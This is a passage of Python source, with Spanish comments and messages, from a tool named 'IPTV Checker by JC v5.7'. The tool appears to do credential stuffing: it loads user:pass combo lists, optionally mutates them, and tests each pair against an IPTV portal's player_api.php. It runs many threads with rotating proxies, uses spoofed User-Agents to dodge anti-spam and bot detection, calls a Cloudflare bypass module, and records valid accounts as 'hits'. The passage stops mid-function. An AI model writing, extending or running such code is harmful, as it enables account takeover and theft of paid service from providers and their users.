    def _select_combo_file(self):
        """Muestra menú para seleccionar archivo de combo existente con formato user:pass"""

        print(f"\n{Colors.CYAN}{'='*70}{Colors.RESET}")
        print(f"{Colors.CYAN}SELECCIÓN DE CARPETA DE COMBOS{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*70}{Colors.RESET}\n")
        print(f"{Colors.YELLOW}[1] Usar carpeta predeterminada (combo/){Colors.RESET}")
        print(f"{Colors.YELLOW}[2] Seleccionar carpeta con explorador{Colors.RESET}")
        print(f"{Colors.YELLOW}[0] Cancelar{Colors.RESET}\n")

        folder_choice = input(f"{Colors.GREEN}Seleccione una opción [0-2]: {Colors.RESET}")

        combo_dir = 'combo'

        if folder_choice == '2':
            try:
                import tkinter as tk
                from tkinter import filedialog

                root = tk.Tk()
                root.withdraw()
                root.attributes('-topmost', True)

                custom_path = filedialog.askdirectory(
                    title="Seleccione la carpeta de combos",
                    initialdir=os.getcwd()
                )

                root.destroy()

                if custom_path and os.path.exists(custom_path) and os.path.isdir(custom_path):
                    combo_dir = custom_path
                    print(f"{Colors.GREEN}✓ Usando carpeta personalizada: {combo_dir}{Colors.RESET}")
                elif custom_path:
                    print(f"{Colors.RED}✗ La ruta no existe o no es una carpeta válida{Colors.RESET}")
                    print(f"{Colors.YELLOW}Usando carpeta predeterminada: combo/{Colors.RESET}")
                    combo_dir = 'combo'
                else:
                    print(f"{Colors.YELLOW}Selección cancelada. Usando carpeta predeterminada: combo/{Colors.RESET}")
                    combo_dir = 'combo'
            except ImportError:
                print(f"{Colors.RED}✗ tkinter no está disponible. Ingrese la ruta manualmente:{Colors.RESET}")
                custom_path = input(f"\n{Colors.GREEN}Ingrese la ruta de la carpeta (ej: C:\\combos o D:\\archivos): {Colors.RESET}").strip()
                if custom_path and os.path.exists(custom_path) and os.path.isdir(custom_path):
                    combo_dir = custom_path
                    print(f"{Colors.GREEN}✓ Usando carpeta personalizada: {combo_dir}{Colors.RESET}")
                elif custom_path:
                    print(f"{Colors.RED}✗ La ruta no existe o no es una carpeta válida{Colors.RESET}")
                    print(f"{Colors.YELLOW}Usando carpeta predeterminada: combo/{Colors.RESET}")
                    combo_dir = 'combo'
            except Exception as e:
                print(f"{Colors.RED}✗ Error al abrir selector de carpetas: {e}{Colors.RESET}")
                print(f"{Colors.YELLOW}Usando carpeta predeterminada: combo/{Colors.RESET}")
                combo_dir = 'combo'
        elif folder_choice == '0':
            return None

        if not os.path.exists(combo_dir):
            os.makedirs(combo_dir)

        all_txt_files = sorted([f for f in os.listdir(combo_dir) if f.endswith('.txt')])

        combo_files = []
        file_sizes = {}

        for file in all_txt_files:
            file_path = os.path.join(combo_dir, file)
            valid_format = False

            file_size = os.path.getsize(file_path)

            with open(file_path, 'r', errors='ignore') as f:
                for line in f:
                    if ':' in line.strip():
                        valid_format = True
                        break

            if valid_format:
                combo_files.append(file)

                if file_size < 1024:
                    file_sizes[file] = f"{file_size} bytes"
                elif file_size < 1024 * 1024:
                    file_sizes[file] = f"{file_size/1024:.2f} KB"
                else:
                    file_sizes[file] = f"{file_size/(1024*1024):.2f} MB"

        if not combo_files:
            print(f"{Colors.RED}No se encontraron archivos de combo con formato user:pass en la carpeta {combo_dir}/{Colors.RESET}")
            return None

        print(f"\n{Colors.CYAN}Archivos de combo disponibles en {combo_dir}/ (user:pass):{Colors.RESET}")
        for i, file in enumerate(combo_files):
            print(f"{Colors.YELLOW}{i + 1}. {file} - {file_sizes[file]}{Colors.RESET}")

        print(f"\n{Colors.YELLOW}Se encontraron {len(combo_files)} archivos de formato user:pass!{Colors.RESET}")

        try:
            choice = int(input(f"\n{Colors.GREEN}Ingrese número de combo: {Colors.RESET}"))
            if 1 <= choice <= len(combo_files):
                return os.path.join(combo_dir, combo_files[choice - 1])
        except:
            print(f"{Colors.RED}Selección no válida{Colors.RESET}")

        return None

    def _load_combo(self):
        """Carga el archivo de combo seleccionado y maneja correctamente la posición de inicio"""
        if not self.combo_file or not os.path.exists(self.combo_file):
            print(f"{Colors.RED}Archivo de combo no válido{Colors.RESET}")
            return False

        try:
            with open(self.combo_file, 'r', encoding='utf-8', errors='ignore') as f:
                self.combo_lines = [line.strip() for line in f if line.strip() and ':' in line]

            self.stats['total'] = len(self.combo_lines)

            if self.stats['total'] == 0:
                print(f"{Colors.RED}No se encontraron combinaciones válidas en el archivo{Colors.RESET}")
                return False

            print(f"\n{Colors.GREEN}Combo cargado exitosamente:{Colors.RESET}")
            print(f"{Colors.WHITE}• Archivo: {Colors.YELLOW}{os.path.basename(self.combo_file)}{Colors.RESET}")
            print(f"{Colors.WHITE}• Total de líneas: {Colors.CYAN}{self.stats['total']:,}{Colors.RESET}")
            print(f"{Colors.WHITE}• Tamaño del archivo: {Colors.CYAN}{self._get_file_size_str(self.combo_file)}{Colors.RESET}")

            preview_lines = min(3, len(self.combo_lines))
            print(f"\n{Colors.YELLOW}Vista previa (primeras {preview_lines} líneas):{Colors.RESET}")
            for i in range(preview_lines):
                user_part = self.combo_lines[i].split(':')[0]
                print(f"{Colors.CYAN}  {i+1:>3}. {user_part}:****{Colors.RESET}")

            if len(self.combo_lines) > 3:
                print(f"{Colors.GREY}  ... y {len(self.combo_lines) - 3:,} líneas más{Colors.RESET}")

            if self.start_position > 0:

                if self.start_position >= self.stats['total']:
                    print(f"\n{Colors.YELLOW}⚠ Checkpoint indica posición {self.start_position + 1} pero el combo solo tiene {self.stats['total']} líneas{Colors.RESET}")
                    print(f"{Colors.GREEN}✓ Todas las líneas del combo ya fueron procesadas{Colors.RESET}")

                    self.start_position = self.stats['total']
                    self.stats['remaining'] = 0
                    return True

                self.stats['remaining'] = self.stats['total'] - self.start_position

                selected_line = self.combo_lines[self.start_position]
                user_part = selected_line.split(':')[0]

                print(f"\n{Colors.CYAN}{'='*70}{Colors.RESET}")
                print(f"{Colors.GREEN}{Colors.BOLD}CONTINUANDO DESDE CHECKPOINT{Colors.RESET}")
                print(f"{Colors.CYAN}{'='*70}{Colors.RESET}")
                print(f"{Colors.WHITE}• Posición de inicio: {Colors.CYAN}Línea {self.start_position + 1:,}{Colors.RESET}")
                print(f"{Colors.WHITE}• Usuario de inicio: {Colors.CYAN}{user_part}{Colors.RESET}")
                print(f"{Colors.WHITE}• Combinaciones a procesar: {Colors.CYAN}{self.stats['remaining']:,}{Colors.RESET}")
                print(f"{Colors.WHITE}• Combinaciones omitidas: {Colors.YELLOW}{self.start_position:,}{Colors.RESET}")
                print(f"{Colors.CYAN}{'='*70}{Colors.RESET}\n")

                return True

            while True:
                print(f"\n{Colors.CYAN}Opciones de inicio:{Colors.RESET}")
                print(f"{Colors.WHITE}• ENTER: Comenzar desde el principio (línea 1){Colors.RESET}")
                print(f"{Colors.WHITE}• Número: Comenzar desde línea específica (1-{self.stats['total']:,}){Colors.RESET}")

                start_pos = input(f"\n{Colors.GREEN}Ingrese posición de inicio: {Colors.RESET}")

                if not start_pos.strip():
                    self.start_position = 0
                    self.stats['remaining'] = self.stats['total']
                    print(f"{Colors.GREEN}[OK] Comenzando desde el principio - Se procesaran {self.stats['remaining']:,} combinaciones{Colors.RESET}")
                    break

                try:
                    pos = int(start_pos.replace(',', ''))
                    if 1 <= pos <= self.stats['total']:
                        self.start_position = pos - 1
                        self.stats['remaining'] = self.stats['total'] - self.start_position

                        selected_line = self.combo_lines[self.start_position]
                        user_part = selected_line.split(':')[0]

                        print(f"{Colors.GREEN}[OK] Comenzando desde la linea {pos:,}{Colors.RESET}")
                        print(f"{Colors.WHITE}• Usuario de inicio: {Colors.CYAN}{user_part}{Colors.RESET}")
                        print(f"{Colors.WHITE}• Combinaciones a procesar: {Colors.CYAN}{self.stats['remaining']:,}{Colors.RESET}")
                        print(f"{Colors.WHITE}• Combinaciones omitidas: {Colors.YELLOW}{self.start_position:,}{Colors.RESET}")
                        break
                    else:
                        print(f"{Colors.RED}Posición fuera de rango. Debe estar entre 1 y {self.stats['total']:,}{Colors.RESET}")
                except ValueError:
                    print(f"{Colors.RED}Por favor ingrese un número válido{Colors.RESET}")

            return True
        except Exception as e:
            logger.error(f"Error al cargar combo: {e}")
            print(f"{Colors.RED}Error al cargar el archivo de combo: {str(e)}{Colors.RESET}")
            return False

    def _get_file_size_str(self, file_path):
        """Obtiene el tamaño del archivo en formato legible"""
        try:
            size_bytes = os.path.getsize(file_path)
            if size_bytes < 1024:
                return f"{size_bytes} bytes"
            elif size_bytes < 1024 * 1024:
                return f"{size_bytes/1024:.1f} KB"
            else:
                return f"{size_bytes/(1024*1024):.1f} MB"
        except:
            return "Desconocido"

    def _setup_credentials_processor(self):
        """Configura el procesador de credenciales"""

        print(f"\n{Colors.CYAN}Opciones de procesamiento de credenciales:{Colors.RESET}")
        print(f"""
    {Colors.YELLOW}0. No modificar credenciales
    1. Añadir sufijo al usuario
    2. Añadir prefijo al usuario
    3. Añadir sufijo a la contraseña
    4. Añadir prefijo a la contraseña
    5. Invertir contraseña
    6. Capitalizar usuario y contraseña
    7. Usar contraseña personalizada{Colors.RESET}
        """)

        try:
            option = int(input(f"{Colors.GREEN}Ingrese una opción (0-7): {Colors.RESET}"))

            if option == 0:
                self.credentials_processor = lambda u, p: (u, p)
            elif option in [1, 2, 3, 4]:
                affix = input(f"{Colors.GREEN}Ingrese sufijo/prefijo: {Colors.RESET}")

                if option == 1:  
                    self.credentials_processor = lambda u, p: (f"{u}{affix}", p)
                elif option == 2:  
                    self.credentials_processor = lambda u, p: (f"{affix}{u}", p)
                elif option == 3:  
                    self.credentials_processor = lambda u, p: (u, f"{p}{affix}")
                elif option == 4:  
                    self.credentials_processor = lambda u, p: (u, f"{affix}{p}")
            elif option == 5:  
                self.credentials_processor = lambda u, p: (u, p[::-1])
            elif option == 6:  
                self.credentials_processor = lambda u, p: (u.capitalize(), p.capitalize())
            elif option == 7:  
                custom_pass = input(f"{Colors.GREEN}Ingrese contraseña personalizada: {Colors.RESET}")
                self.credentials_processor = lambda u, p: (u, custom_pass)
            else:
                print(f"{Colors.YELLOW}Opción no válida, no se modificarán las credenciales{Colors.RESET}")
                self.credentials_processor = lambda u, p: (u, p)
        except:
            print(f"{Colors.YELLOW}Entrada no válida, no se modificarán las credenciales{Colors.RESET}")
            self.credentials_processor = lambda u, p: (u, p)

    def _setup_portal(self):
        """Configura el portal IPTV con detección automática de puertos"""
        portal_input = input(f"\n{Colors.YELLOW}Ingrese el portal (host:puerto): {Colors.RESET}")

        if not portal_input.strip() and self.combo_lines:
            logger.info("No se ingresó portal, intentando detectar del combo...")
            print(f"{Colors.CYAN}Detectando portal automáticamente del combo...{Colors.RESET}")

            for i, line in enumerate(self.combo_lines[:10]):
                _, _, host_from_line = self._parse_combo_line(line)
                if host_from_line:
                    portal_input = host_from_line.replace('http://', '').replace('https://', '')
                    print(f"{Colors.GREEN}✅ Portal detectado del combo: {host_from_line}{Colors.RESET}")
                    logger.info(f"Portal detectado de línea {i+1}: {portal_input}")
                    break
            else:
                print(f"{Colors.YELLOW}⚠️ No se detectó portal en el combo, usando puerto 80 por defecto{Colors.RESET}")
                portal_input = ":80"

        if "://" in portal_input:
            parts = portal_input.split("://")
            self.protocol = parts[0]
            portal_input = parts[1]
        else:
            self.protocol = "http"

        portal_input = portal_input.replace("/c", "").replace("/", "")

        if ":" not in portal_input:

            common_ports = [80, 8080, 25461, 2086, 8800, 8008, 443]
            print(f"{Colors.YELLOW}Detectando puerto automáticamente...{Colors.RESET}")

            for port in common_ports:
                try:
                    test_url = f"{self.protocol}://{portal_input}:{port}/player_api.php?username=test&password=test"
                    response = http_manager.make_request(test_url, timeout=(2, 4))

                    if response and response.status_code in [200, 401]:
                        print(f"{Colors.GREEN}Puerto {port} detectado y funcionando.{Colors.RESET}")
                        portal_input = f"{portal_input}:{port}"
                        break
                except:
                    continue
            else:

                portal_input = f"{portal_input}:80"

        self.portal = portal_input

        domain = portal_input.split(':')[0]
        is_anti_spam = any(spam_domain in domain for spam_domain in [
            'smarttvpanel.com', 'castlempire.site'
        ])

        if is_anti_spam:
            print(f"\n{Colors.YELLOW}⚠️  SERVIDOR CON PROTECCIÓN ANTI-SPAM DETECTADO ⚠️{Colors.RESET}")
            print(f"{Colors.YELLOW}Este servidor ({domain}) tiene protección anti-spam agresiva.{Colors.RESET}")
            print(f"{Colors.YELLOW}Se aplicarán las siguientes optimizaciones:{Colors.RESET}")
            print(f"{Colors.CYAN}• Delays más largos entre requests{Colors.RESET}")
            print(f"{Colors.CYAN}• Headers VLC para evitar detección{Colors.RESET}")
            print(f"{Colors.CYAN}• Categorías deshabilitadas automáticamente{Colors.RESET}")
            print(f"{Colors.CYAN}• Información de contenido limitada{Colors.RESET}")

            if not hasattr(self, 'get_categories'):
                self.get_categories = False
                print(f"{Colors.GREEN}[OK] Categorias deshabilitadas para evitar bloqueos{Colors.RESET}")

        run_diagnosis = input(f"{Colors.YELLOW}¿Desea realizar un diagnóstico del servidor? (s/n): {Colors.RESET}").lower()
        if run_diagnosis == 's':
            self.diagnose_server(f"{self.protocol}://{self.portal}")

        try:
            test_url = f"{self.protocol}://{self.portal}/player_api.php?username=test&password=test"
            response = http_manager.make_request(test_url, timeout=(1, 2))

            if response and response.status_code in [200, 401]:
                return True

            print(f"{Colors.YELLOW}Advertencia: No se pudo verificar el portal. Respuesta: {response.status_code if response else 'None'}{Colors.RESET}")
            confirm = input(f"{Colors.YELLOW}¿Desea continuar de todos modos? (s/n): {Colors.RESET}").lower()
            return confirm == 's'
        except Exception as e:
            logger.error(f"Error verificando portal: {e}")
            print(f"{Colors.RED}Error al verificar el portal: {str(e)}{Colors.RESET}")
            confirm = input(f"{Colors.YELLOW}¿Desea continuar de todos modos? (s/n): {Colors.RESET}").lower()
            return confirm == 's'

    def diagnose_server(self, url):
        """Diagnostica si un servidor tiene protección anti-DDoS"""
        print(f"{Colors.CYAN}Diagnosticando servidor {url}...{Colors.RESET}")

        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
            '(Mozilla/5.0 (Linux; Android 9; ANE-LX3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36)',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1'
        ]

        results = {}

        for agent in user_agents:
            session = requests.Session()
            session.headers.update({'User-Agent': agent})

            try:
                response = session.get(f"{url}/player_api.php?username=test&password=test", timeout=2)
                results[agent] = {
                    'status_code': response.status_code,
                    'response_size': len(response.text),
                    'is_json': True if 'application/json' in response.headers.get('Content-Type', '') else False
                }
            except Exception as e:
                results[agent] = {'error': str(e)}

        if all('error' in result for result in results.values()):
            print(f"{Colors.RED}El servidor parece estar bloqueando todas las conexiones.{Colors.RESET}")
            return False

        if any(result.get('status_code') == 403 for result in results.values()):
            print(f"{Colors.YELLOW}Posible firewall o protección DDoS detectada (código 403).{Colors.RESET}")
            return False

        if len(set(r.get('status_code') for r in results.values() if 'status_code' in r)) > 1:
            print(f"{Colors.YELLOW}El servidor responde de manera diferente según el User-Agent. Posible detección de bot.{Colors.RESET}")
            return False

        print(f"{Colors.GREEN}El servidor parece accesible. Use los headers adecuados para las solicitudes.{Colors.RESET}")

        best_agent = None
        best_score = -1

        for agent, result in results.items():
            if 'status_code' in result and result['status_code'] == 200:
                score = result.get('response_size', 0)
                if score > best_score:
                    best_score = score
                    best_agent = agent

        if best_agent:
            print(f"{Colors.GREEN}User-Agent recomendado: {best_agent}{Colors.RESET}")

            use_agent = input(f"{Colors.YELLOW}¿Desea usar este User-Agent para la verificación? (s/n): {Colors.RESET}").lower()
            if use_agent == 's':

                http_manager.set_specific_ua(best_agent)
                print(f"{Colors.GREEN}User-Agent configurado para esta sesión.{Colors.RESET}")

        return True

    def _periodic_cleanup_thread(self):
        """Hilo que limpia periódicamente recursos para mantener el rendimiento"""
        cleanup_interval = 60  
        last_cleanup_time = time.time()

        while self.running:
            current_time = time.time()

            if current_time - last_cleanup_time >= cleanup_interval:

                if self.retry_queue.qsize() > 5000:

                    try:
                        for _ in range(1000):  
                            try:
                                self.retry_queue.get(block=False)
                                self.retry_queue.task_done()
                            except queue.Empty:
                                break
                    except:
                        pass

                last_cleanup_time = current_time

                if proxy_manager.enabled:
                    proxy_manager._save_proxy_cache()

            time.sleep(10)  

    def update_window_title_with_stats(self):
        """Actualiza el título de la ventana con estadísticas en tiempo real"""
        try:
            device_type = detect_device_type()

            if device_type == 'pc':

                title = f"IPTV Checker by JC v5.7 - Hits {self.stats['hits']} Fails {self.stats['fails']} Retries {self.stats['retries']} Custom {self.stats['custom']}"
                set_window_title(title)
            else:

                set_window_title("IPTV Checker by JC v5.7")
        except:
            pass

    def _proxy_health_monitor_thread(self):
        """Monitor que ejecuta en background para detectar proxies problemáticos"""

        while self.running:
            try:
                current_time = time.time()

                stale_proxies = []

                for proxy in proxy_manager.active_proxies:
                    proxy_str = proxy_manager._proxy_to_str(proxy)

                    last_response = proxy_timeout_manager.proxy_last_response.get(proxy_str, 0)
                    if last_response > 0 and (current_time - last_response) > 120:
                        stale_proxies.append(proxy)

                for proxy in stale_proxies:
                    proxy_timeout_manager.mark_proxy_frozen(proxy, "stale_no_response")

                if stale_proxies:
                    logger.info(f"Marcados {len(stale_proxies)} proxies como obsoletos")

                if int(current_time) % 600 == 0:
                    old_frozen = [p for p in proxy_timeout_manager.frozen_proxies]
                    proxy_timeout_manager.frozen_proxies.clear()
                    logger.info(f"Cache de proxies congelados limpiado: {len(old_frozen)} entradas")

                time.sleep(30)  

            except Exception as e:
                logger.error(f"Error en monitor de salud de proxies: {e}")
                time.sleep(60)

    def _get_optimized_headers(self, url):
        """Obtiene headers optimizados para la URL"""
        return {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache'
        }

    def start(self):
        """Inicia el proceso de verificación con manejo mejorado de reintentos y proxies"""
        hide_cursor()
        self.running = True
        self.start_time = time.time()

        for i in range(self.start_position, self.stats['total']):
            self.task_queue.put(i)

        import multiprocessing
        cpu_count = multiprocessing.cpu_count()

        device_type = detect_device_type()
        if device_type == 'pc':
            set_window_title("IPTV Checker by JC v5.7 - Iniciando verificación...")

        if proxy_manager.enabled:

            proxy_count = len(proxy_manager.active_proxies)
            recommended_threads = min(self.thread_count, proxy_count * 2, cpu_count * 50)
        else:

            recommended_threads = min(self.thread_count, cpu_count * 10)

        if self.thread_count != recommended_threads:
            print(f"{Colors.YELLOW}Ajustando threads de {self.thread_count} a {recommended_threads} para rendimiento óptimo{Colors.RESET}")
            self.thread_count = recommended_threads

        self.retries_processed = False

        cleanup_thread = threading.Thread(
            target=self._periodic_cleanup_thread,
            name="CleanupThread",
            daemon=False  
        )
        cleanup_thread.start()

        self.threads = []
        for i in range(self.thread_count):
            thread = threading.Thread(
                target=self._worker_thread,
                name=f"Checker-{i+1}",
                daemon=False  
            )
            self.threads.append(thread)
            thread.start()

        display_thread = threading.Thread(
            target=self._display_thread,
            name="Display",
            daemon=False  
        )
        display_thread.start()

        checkpoint_thread = threading.Thread(
            target=self._periodic_checkpoint_thread,
            name="Checkpoint",
            daemon=False  
        )
        checkpoint_thread.start()

        max_run_time = 7200  
        start_run_time = time.time()

        try:

            task_wait_start = time.time()
            task_timeout = 1800  

            print(f"{Colors.CYAN}Iniciando verificación principal...{Colors.RESET}")

            while not self.task_queue.empty():

                if hasattr(self, 'ip_banned') and self.ip_banned:
                    logger.warning("IP baneada detectada, pausando verificación...")
                    self._pause_for_ip_change()

                if time.time() - start_run_time > max_run_time or time.time() - task_wait_start > task_timeout:
                    logger.warning("Tiempo máximo de ejecución excedido, procesando reintentos...")
                    break

                active_threads = sum(1 for t in self.threads if t.is_alive())
                if active_threads == 0 and not self.task_queue.empty():
                    logger.warning(f"Todos los threads terminaron pero quedan {self.task_queue.qsize()} tareas - forzando finalización")
                    break

                time.sleep(0.5)

            if self.task_queue.empty():
                logger.info("Todas las tareas principales completadas")
                print(f"\n{Colors.GREEN}[OK] Verificacion principal completada{Colors.RESET}")

                if not self.retry_queue.empty():
                    retry_count = self.retry_queue.qsize()
                    print(f"\n{Colors.CYAN}=== PROCESAMIENTO DE REINTENTOS ==={Colors.RESET}")
                    print(f"{Colors.YELLOW}Se encontraron {retry_count} cuentas para reintentar{Colors.RESET}")

                    if proxy_manager.enabled:
                        good_proxies = len([p for p in proxy_manager.active_proxies 
                                        if not proxy_manager.is_bad_proxy(p)])
                        total_proxies = len(proxy_manager.active_proxies)

                        print(f"{Colors.YELLOW}Estado de proxies: {good_proxies}/{total_proxies} funcionales{Colors.RESET}")

                        if good_proxies < 5:
                            print(f"{Colors.RED}⚠️  ADVERTENCIA: Solo {good_proxies} proxies funcionales disponibles{Colors.RESET}")
                            print(f"{Colors.YELLOW}Los reintentos podrían tener una alta tasa de fallo{Colors.RESET}")

                            choice = input(f"{Colors.YELLOW}¿Continuar con reintentos limitados? (s/n, ENTER=s): {Colors.RESET}").lower()
                            if choice in ['n', 'no']:
                                print(f"{Colors.CYAN}Saltando procesamiento de reintentos por decisión del usuario{Colors.RESET}")
                                self._handle_skipped_retries(retry_count)
                            else:
                                self._process_retries()
                        else:
                            print(f"{Colors.GREEN}Suficientes proxies disponibles para reintentos{Colors.RESET}")
                            self._process_retries()
                    else:
                        print(f"{Colors.YELLOW}Procesando reintentos sin proxies (conexión directa){Colors.RESET}")
                        print(f"{Colors.YELLOW}Nota: Puede haber limitaciones por rate limiting del servidor{Colors.RESET}")
                        self._process_retries()
                else:
                    print(f"\n{Colors.GREEN}[OK] No hay reintentos pendientes{Colors.RESET}")
            else:
                logger.warning("La cola de tareas no está vacía a pesar de la espera")
                remaining_tasks = self.task_queue.qsize()
                print(f"\n{Colors.YELLOW}⚠️  {remaining_tasks} tareas principales no completadas{Colors.RESET}")

                if not self.retry_queue.empty():
                    retry_count = self.retry_queue.qsize()
                    print(f"{Colors.YELLOW}Procesando {retry_count} reintentos a pesar de tareas pendientes{Colors.RESET}")
                    self._process_retries()

            logger.info("Marcando reintentos como procesados")
            self.retries_processed = True

        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}Verificación interrumpida por el usuario. Cerrando de forma segura...{Colors.RESET}")

            if not self.retry_queue.empty():
                pending_retries = self.retry_queue.qsize()
                print(f"{Colors.YELLOW}Interrupción detectada con {pending_retries} reintentos pendientes{Colors.RESET}")

                pending_indices = []
                while not self.retry_queue.empty():
                    try:
                        index = self.retry_queue.get(timeout=0.1)
                        pending_indices.append(index)
                        self.retry_queue.task_done()
                    except:
                        break

                if pending_indices:
                    print(f"{Colors.CYAN}Guardando {len(pending_indices)} reintentos pendientes...{Colors.RESET}")
                    self._save_pending_retries(pending_indices)

            print(f"{Colors.CYAN}Guardando checkpoint...{Colors.RESET}")
            self.save_checkpoint()

            if device_type == 'pc':
                interrupt_title = f"IPTV Checker by JC v5.7 - INTERRUMPIDO - Hits {self.stats['hits']}"
                set_window_title(interrupt_title)

            if proxy_manager.enabled:
                proxy_manager._save_proxy_cache()

            print(f"{Colors.GREEN}Estado guardado correctamente. Puede reanudar la verificación más tarde.{Colors.RESET}")

        except Exception as e:
            logger.error(f"Error inesperado en start(): {e}")
            print(f"\n{Colors.RED}Error inesperado: {str(e)}{Colors.RESET}")

            try:
                self.save_checkpoint()
                if proxy_manager.enabled:
                    proxy_manager._save_proxy_cache()
            except:
                pass

        finally:

            print(f"{Colors.CYAN}Cerrando threads de forma segura...{Colors.RESET}")

            self.running = False

            print(f"{Colors.YELLOW}Cerrando {len(self.threads)} threads trabajadores...{Colors.RESET}")
            for i, thread in enumerate(self.threads):
                if thread.is_alive():
                    print(f"{Colors.CYAN}Cerrando thread {i+1}/{len(self.threads)}...{Colors.RESET}")
                    thread.join(timeout=3)  
                    if thread.is_alive():
                        logger.warning(f"Thread {thread.name} no terminó en tiempo esperado")

            print(f"{Colors.CYAN}Cerrando threads auxiliares...{Colors.RESET}")
            try:
                if 'display_thread' in locals() and display_thread.is_alive():
                    display_thread.join(timeout=2)
                    if display_thread.is_alive():
                        logger.warning("Display thread no terminó correctamente")

                if 'checkpoint_thread' in locals() and checkpoint_thread.is_alive():
                    checkpoint_thread.join(timeout=2)
                    if checkpoint_thread.is_alive():
                        logger.warning("Checkpoint thread no terminó correctamente")

                if 'cleanup_thread' in locals() and cleanup_thread.is_alive():
                    cleanup_thread.join(timeout=2)
                    if cleanup_thread.is_alive():
                        logger.warning("Cleanup thread no terminó correctamente")
            except Exception as e:
                logger.error(f"Error cerrando threads auxiliares: {e}")

            show_cursor()

            if proxy_manager.enabled:
                try:
                    proxy_manager._save_proxy_cache()
                    print(f"{Colors.GREEN}Cache de proxies guardado{Colors.RESET}")
                except Exception as e:
                    logger.error(f"Error guardando cache de proxies: {e}")

            if device_type == 'pc':
                try:
                    final_stats = f"Hits: {self.stats['hits']} | Checked: {self.stats['checked']} | Retries: {self.stats['retries']}"
                    set_window_title(f"IPTV Checker by JC v5.7 - Finalizado - {final_stats}")
                except:
                    set_window_title("IPTV Checker by JC v5.7 - Finalizado")

            print(f"{Colors.GREEN}Cierre seguro completado.{Colors.RESET}")

            time.sleep(1)

            logger.info("Mostrando resumen final")
            self._show_final_summary()

            self._save_results()

    def _check_proxy_health(self, proxy, timeout=3):
        """Verifica rápidamente si un proxy responde"""
        if not proxy:
            return False

        try:
            test_response = requests.get(
                'http://httpbin.org/ip', 
                proxies=proxy, 
                timeout=timeout,
                verify=False
            )
            return test_response.status_code == 200
        except:
            return False

    def _check_account(self, session, user, password, proxy):
        """
        Verifica una cuenta IPTV - VERSIÓN CORREGIDA
        Con soporte Cloudflare integrado
        """

        if 'cloudflare_bypass' in globals() and cloudflare_bypass:
            try:
                if cloudflare_bypass.is_cloudflare_protected(self.portal):
                    logger.info(f"🌙 Usando Cloudflare bypass para {self.portal}")

                    result = cloudflare_bypass.check_account_with_cloudflare_bypass(
                        f"{self.protocol}://{self.portal}",
                        user,
                        password,
                        session,
                        proxy
                    )

                    result['portal'] = self.portal
                    return result
            except Exception as e:
                logger.error(f"Error en Cloudflare bypass: {e}")

        url = f"{self.protocol}://{self.portal}/player_api.php?username={user}&password={password}"

        result = {
            'user': user,
            'pass': password,
            'status': 'fail',
            'portal': self.portal,
            'protocol': self.protocol
        }

        is_special = self._check_special_domain(self.portal)
        is_anti_spam = self._is_anti_spam_domain(self.portal)

        if is_special or is_anti_spam:
            custom_headers = {
                'User-Agent': 'VLC/3.0.16 LibVLC/3.0.16',
                'Accept': '*/*',
                'Connection': 'close',
                'Host': self.portal
            }
        else:
            custom_headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'application/json, text/plain, */*',
                'Connection': 'close'
            }

        max_retries = 2
        retry_count = 0

        while retry_count <= max_retries:
            try:
                start_req = time.time()

                response = requests.get(
                    url,
                    proxies=proxy,
                    timeout=(2, 5),
                    verify=False,
                    headers=custom_headers
                )

                request_duration = time.time() - start_req

                if response.status_code != 200:
                    if response.status_code in [400, 401, 404, 405]: 
                        logger.info(f"FAIL: {user} - Status {response.status_code}")
                        result['status'] = 'fail'
                        return result
                    elif response.status_code in [403, 429, 500, 502, 503, 504]:
                        logger.warning(f"RETRY: {user} - Status {response.status_code}")
                        result['status'] = 'retry'
                        return result
                    else: 
                        retry_count += 1
                        if retry_count > max_retries:
                            result['status'] = 'fail'
                            return result
                        continue

                content_type = response.headers.get('content-type', '').lower()
                response_text = response.text.strip()

                is_html = (
                    response_text.startswith('<!doctype') or 
                    response_text.startswith('<html') or
                    '<html' in response_text[:200].lower() or
                    'text/html' in content_type
                )

                if is_html:

                    html_keywords = ['google.com', 'schema.org/WebPage', 'google search', 'cloudflare']
                    if any(keyword in response_text[:1000].lower() for keyword in html_keywords):
                        logger.warning(f"RETRY: {user} - Proxy redirigió a página externa (posible proxy mal configurado)")
                        result['status'] = 'retry'
                        return result
                    else:
                        logger.info(f"FAIL: {user} - Servidor retornó HTML (credenciales inválidas)")
                        result['status'] = 'fail'
                        return result

                if 'json' not in content_type:
                    logger.info(f"FAIL: {user} - Content-Type no es JSON: {content_type}")
                    result['status'] = 'fail'
                    return result

                try: 
                    data = response.json()
                except json.JSONDecodeError as e:
                    logger.info(f"FAIL: {user} - JSON inválido: {e}")
                    result['status'] = 'fail'
                    return result

                if 'user_info' not in data:
                    logger.info(f"FAIL: {user} - Sin 'user_info' en respuesta")
                    result['status'] = 'fail'
                    return result

                if not isinstance(data['user_info'], dict):
                    logger.info(f"FAIL: {user} - 'user_info' no es diccionario")
                    result['status'] = 'fail'
                    return result

                user_info = data['user_info']

                auth = user_info.get('auth')

                if auth is None:
                    logger.info(f"FAIL: {user} - Campo 'auth' no presente")
                    result['status'] = 'fail'
                    return result

                try:
                    auth_int = int(auth)
                except (ValueError, TypeError):
                    logger.info(f"FAIL: {user} - auth no es numérico: {auth}")
                    result['status'] = 'fail'
                    return result

                if auth_int == 0:
                    logger.info(f"FAIL CONFIRMADO: {user} - auth=0 (credenciales incorrectas)")
                    result['status'] = 'fail'
                    return result

                status = user_info.get('status', '').strip()

                if auth_int == 1 and status == 'Active':
                    logger.info(f"HIT CONFIRMADO: {user} - auth=1, status=Active")
                    result['status'] = 'hit'
                    result['data'] = data
                    result['user_info'] = user_info
